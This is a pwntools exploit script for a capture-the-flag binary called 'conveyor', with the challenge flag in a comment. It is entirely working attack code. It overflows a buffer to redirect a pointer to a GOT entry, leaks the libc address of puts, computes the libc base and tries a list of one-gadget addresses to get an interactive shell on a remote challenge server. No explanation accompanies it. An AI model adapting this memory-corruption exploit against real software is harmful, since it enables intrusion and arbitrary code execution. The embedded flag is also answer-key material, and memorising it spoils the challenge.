#exploit for conveyor
#flag=flag{you_broke_the_conveyor}
from pwn import *
gadgets=[0x4f2c5,0x4f322,0xe569f,0xe5858,0xe585f,0xe5863,0x10a38c,0x10a398]
elf=ELF('./conveyor')
libc=elf.libc
for gadget in gadgets:
	#target=process('./conveyor')
	target=remote('jh2i.com',50020)

	def add(data):
		print(target.recvuntil("> "))
		target.sendline("1")
		print(target.recvuntil("name: "))
		target.sendline(data)

	def init():
		print(target.recvuntil("> "))
		target.sendline("2")
		
	def check(data="A",option="y"):
		print(target.recvline())
		leak=target.recvline().strip("\n")
		print(leak)
		print(target.recvuntil("safe? "))
		target.sendline(option)
		if(option=="n"):
			print(target.recvuntil("alternative: "))
			target.send(data)
		return leak				
	add("A")
	init()
	payload="A"*0x78+p64(0x602020)
	check(payload,"n")
	print(target.recvline())
	leak=target.recvline().strip("\n")
	libc_puts=u64(leak.ljust(8,"\x00"))
	libc_base=libc_puts-libc.symbols["puts"]
	libc_gadget=libc_base+gadget
	print(hex(libc_base))
	print(target.recvuntil("safe? "))
	target.sendline("n")
	print(target.recvuntil("alternative: "))
	target.send(p64(libc_gadget)*(0x38/8)+"\n")
	target.interactive()
		
		
		

	
